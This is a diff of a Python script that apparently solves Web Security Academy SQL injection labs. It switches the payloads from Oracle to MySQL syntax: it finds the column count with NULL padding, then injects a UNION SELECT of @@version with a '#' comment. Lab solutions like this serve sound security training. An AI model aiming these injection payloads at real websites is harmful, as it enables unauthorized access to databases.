@@ -31,9 +31,7 @@ def get_col_nums(URL, max_col=10):
     for _ in range(max_col):
         PAYLOAD += "NULL, "
 
-        response: r.Response = session.get(
-            URL + quote(PAYLOAD.strip(", ") + " FROM dual --")
-        )
+        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + "#"))
 
         if response.status_code == 200:
             break
@@ -44,17 +42,15 @@ def get_col_nums(URL, max_col=10):
 
 
 def main() -> None:
-    URL = "https://0a92004f030444ca80c908e100a100f2.web-security-academy.net/filter?category=Accessories"
+    URL = "https://0a77003b040955d0845da94b005b00e4.web-security-academy.net/filter?category=Pets"
 
     PAYLOAD = quote(
-        "' UNION SELECT "
-        + ("BANNER, " * get_col_nums(URL, 10)).strip(", ")
-        + " FROM v$version--"
+        "' UNION SELECT " + ("@@version, " * get_col_nums(URL, 10)).strip(", ") + "#"
     )
 
     response: r.Response = r.get(URL + PAYLOAD)
-
     print(response.text)
+    print(response.status_code)
 
 
 if __name__ == "__main__":
